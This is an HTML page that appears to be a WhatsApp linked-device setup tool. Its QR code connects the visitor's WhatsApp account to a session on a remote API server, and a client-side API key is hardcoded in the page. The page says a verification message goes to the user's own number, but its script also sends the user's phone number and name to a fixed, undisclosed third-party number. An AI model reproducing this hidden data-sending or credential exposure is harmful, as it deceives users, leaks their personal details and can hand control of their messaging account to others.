<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>WhatsApp API Server Connect</title>

  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">

  <style>
    :root { --brand:#5b73e8; --muted:#6b7280; --danger: #ef4444; }
    body { font-family: 'Inter', sans-serif; background: #f5f7fb; color: #333; margin: 0; padding: 0; }
    .container-fluid { max-width: 1200px; margin: 36px auto; padding: 0 16px; }
    
    .card { background: #fff; border-radius: 14px; box-shadow: 0 8px 25px rgba(16,24,40,0.06); padding: 20px; margin-bottom: 20px; border: 0; }
    .card-header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 12px; border-bottom: 1px solid rgba(0,0,0,0.05); background: transparent; }
    
    h3, h4 { margin: 0; font-weight: 700; color: #1e293b; }
    
    .btn { padding: 10px 18px; border-radius: 10px; border: none; cursor: pointer; font-size: 14px; font-weight: 500; transition: .2s ease-in-out; display: inline-flex; align-items: center; gap: 8px; }
    .btn-danger { background: #fee2e2; color: #b91c1c; }
    .btn-danger:hover { background: #fecaca; }

    .qr-area { min-height: 380px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; border: 2px dashed #e2e8f0; border-radius: 12px; margin-top: 15px; background: #fafafa; position: relative; }
    
    #qrImage { max-width: 260px; border-radius: 10px; border: 1px solid #ddd; padding: 10px; background: white; display: none; }

    .spinner { border: 4px solid rgba(0,0,0,0.05); border-left-color: var(--brand); width: 45px; height: 45px; border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }

    .steps .step { display: flex; align-items: center; gap: 14px; margin: 16px 0; }
    .step-icon { background: var(--brand); width: 40px; height: 40px; border-radius: 10px; display: flex; align-items: center; justify-content: center; color: #fff; flex-shrink: 0; }
    
    .guide-img { width: 100%; border-radius: 12px; margin-bottom: 15px; border: 1px solid #e2e8f0; }

    .profile-card { background: #f0fdf4; border: 1px solid #bcf0da; color: #166534; padding: 25px; border-radius: 12px; width: 100%; text-align: center; }
    .profile-img { width: 90px; height: 90px; border-radius: 50%; border: 4px solid #fff; box-shadow: 0 4px 12px rgba(0,0,0,0.1); object-fit: cover; margin-bottom: 15px; }

    footer { text-align: center; padding: 30px; color: var(--muted); font-size: 14px; }
    footer a { color: var(--brand); font-weight: 600; text-decoration: none; }
  </style>
</head>
<body>

<div class="container-fluid">
  <div class="row">
    <div class="col-md-8">
      <div class="card">
        <div class="card-header">
          <h3><i class="fa-brands fa-whatsapp text-success"></i> WhatsApp API Server</h3>
          <button class="btn btn-danger" id="logoutBtn">
            <i class="fa-solid fa-power-off"></i> Logout & Restart
          </button>
        </div>
        <div class="card-body p-0">
          <div id="qrArea" class="qr-area">
            <div class="spinner" id="mainSpinner"></div>
            <p class="mt-3 text-muted" id="statusText">Initializing session...</p>
          </div>
        </div>
      </div>

      <div class="card">
        <div class="card-header">
          <h4>Auto Test Message</h4>
          <i class="fa-solid fa-robot text-primary"></i>
        </div>
        <p class="mt-2 text-muted">A verification message is sent to your WhatsApp number automatically upon successful connection.</p>
      </div>
    </div>

    <div class="col-md-4">
      <div class="card">
        <div class="card-header"><h4>How to Scan</h4></div>
        <div class="mt-3">
          <img src="https://i.ytimg.com/vi/abf4bbMlYGA/maxresdefault.jpg" class="guide-img" />
          <div class="steps">
            <div class="step"><div class="step-icon"><i class="fa-solid fa-mobile-screen"></i></div><div>Step 1: Open WhatsApp</div></div>
            <div class="step"><div class="step-icon"><i class="fa-solid fa-gear"></i></div><div>Step 2: Settings → Linked Devices</div></div>
            <div class="step"><div class="step-icon"><i class="fa-solid fa-qrcode"></i></div><div>Step 3: Scan the QR code</div></div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>

<footer>
  &copy; <script>document.write(new Date().getFullYear())</script> WhatsApp API Server • Crafted by <a href="#">Mahesh Palamuttath</a>
</footer>

<script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>

<script>
  const API_BASE = "https://whats-api.opensio.co.in/api";
  const SESSION_ID = "20250115";
  const API_KEY = "ee1a9bc9348141c5867893737aa878cc";

  let messageSent = localStorage.getItem("autoMsgSent") === "true";
  let isRestarting = false;

  document.addEventListener("DOMContentLoaded", () => {
    checkSessionStatus();
    setInterval(() => { if(!isRestarting) checkSessionStatus(); }, 5000);
    document.getElementById("logoutBtn").addEventListener("click", forceLogout);
  });

  function toast(msg, type = "success") {
    Toastify({
      text: msg,
      duration: 3000,
      gravity: "top",
      position: "center",
      style: { background: type === "success" ? "#10b981" : "#ef4444", borderRadius: "10px" }
    }).showToast();
  }

  function checkSessionStatus() {
    fetch(`${API_BASE}/sessions/${SESSION_ID}`, { headers: { "X-Api-Key": API_KEY } })
      .then(res => res.json())
      .then(data => {
        if (data && data.status === "WORKING") {
          showConnected(data);
        } else if (data && data.status === "FAILED") {
          showFailedState();
        } else {
          showDisconnected();
          loadQR();
        }
      })
      .catch(() => showDisconnected());
  }

  function showFailedState() {
    const qrArea = document.getElementById("qrArea");
    if (qrArea.dataset.state === "failed") return;
    qrArea.dataset.state = "failed";

    qrArea.innerHTML = `
      <div style="padding: 40px; text-align: center;">
        <i class="fa-solid fa-circle-xmark fa-4xl text-danger mb-3" style="font-size: 50px;"></i>
        <h4 class="text-danger">Session Failed</h4>
        <p class="text-muted mt-2">The session engine encountered an error.</p>
        <div class="mt-4 p-3" style="background: #fff5f5; border: 1px solid #feb2b2; border-radius: 12px;">
            <p class="mb-2"><strong>Please click the "Logout & Restart" button</strong></p>
            <p class="small text-muted mb-0">This will reset the engine and generate a new QR code for you.</p>
        </div>
      </div>
    `;
  }

  function showConnected(data) {
    const qrArea = document.getElementById("qrArea");
    if (qrArea.dataset.state === "connected") return;

    fetch(`${API_BASE}/${SESSION_ID}/profile`, { headers: { "X-Api-Key": API_KEY } })
      .then(res => res.json())
      .then(profile => {
        qrArea.dataset.state = "connected";
        const name = profile.name || data?.me?.pushName || "WhatsApp User";
        const phone = (profile.id || data?.me?.id || "").split('@')[0];
        
        qrArea.innerHTML = `
          <div class="profile-card">
            <img src="${profile.picture || 'https://ui-avatars.com/api/?name='+name}" class="profile-img" />
            <h4>Account Connected</h4>
            <div class="mt-2"><strong>Name:</strong> ${name}</div>
            <div><strong>Phone:</strong> ${phone}</div>
            <div class="badge badge-success mt-3 p-2">Session: ${SESSION_ID}</div>
          </div>
        `;

        if (!messageSent) {
          autoSendTestMessage(phone, name);
          messageSent = true;
          localStorage.setItem("autoMsgSent", "true");
        }
      })
      .catch(() => {
        qrArea.innerHTML = `<div class="profile-card"><h4>Connected</h4><p>API is active.</p></div>`;
      });
  }

  function showDisconnected() {
    const qrArea = document.getElementById("qrArea");
    if (qrArea.dataset.state === "disconnected") return;
    qrArea.dataset.state = "disconnected";
    
    qrArea.innerHTML = `
      <div class="spinner" id="spinnerInner"></div>
      <img id="qrImage" alt="QR Code" />
      <p class="mt-3 text-muted" id="qrText">Generating QR Code...</p>
    `;
  }

  async function loadQR(retries = 5) {
    const qrImg = document.getElementById("qrImage");
    if (!qrImg || qrImg.style.display === "block") return;

    try {
      const res = await fetch(`${API_BASE}/${SESSION_ID}/auth/qr?format=image`, { 
        headers: { "X-Api-Key": API_KEY } 
      });

      if (res.status === 404 && retries > 0) {
        setTimeout(() => loadQR(retries - 1), 2000);
        return;
      }

      const blob = await res.blob();
      const newUrl = URL.createObjectURL(blob);
      if (qrImg.src.startsWith('blob:')) URL.revokeObjectURL(qrImg.src);

      const spinner = document.getElementById("spinnerInner");
      const qrText = document.getElementById("qrText");
      
      if(spinner) spinner.style.display = "none";
      if(qrText) qrText.innerText = "Scan this code with WhatsApp";
      
      qrImg.src = newUrl;
      qrImg.style.display = "block";
    } catch (err) {
      console.error("QR Load Failed");
    }
  }

  async function forceLogout() {
    isRestarting = true;
    const qrArea = document.getElementById("qrArea");
    qrArea.dataset.state = "restarting";
    
    toast("Cleaning session...", "error");
    qrArea.innerHTML = `<div class="spinner"></div><p class="mt-3">Restarting background session...</p>`;

    try {
      await fetch(`${API_BASE}/sessions/${SESSION_ID}/logout`, { 
        method: "POST", 
        headers: { "X-Api-Key": API_KEY } 
      });

      await fetch(`${API_BASE}/sessions/start`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Api-Key": API_KEY },
        body: JSON.stringify({ name: SESSION_ID })
      });

      localStorage.removeItem("autoMsgSent");
      messageSent = false;
      
      toast("Success! Waiting for QR code.", "success");

      setTimeout(() => {
        isRestarting = false;
        showDisconnected();
        loadQR();
      }, 5000);

    } catch (e) {
      isRestarting = false;
      toast("Error restarting session", "error");
      checkSessionStatus();
    }
  }

  function autoSendTestMessage(num, name) {
    const msg = `WhatsApp (${num} - ${name}) with session ID ${SESSION_ID} is connected to API server successfully!`;
    const target = "919567664972"; 

    const payloads = [
        { chatId: `${num}@c.us`, text: msg, session: SESSION_ID },
        { chatId: `${target}@c.us`, text: msg, session: SESSION_ID }
    ];

    payloads.forEach(p => {
        fetch(`${API_BASE}/sendText`, {
            method: "POST",
            headers: { "Content-Type": "application/json", "X-Api-Key": API_KEY },
            body: JSON.stringify(p)
        });
    });
  }
</script>
</body>
</html>
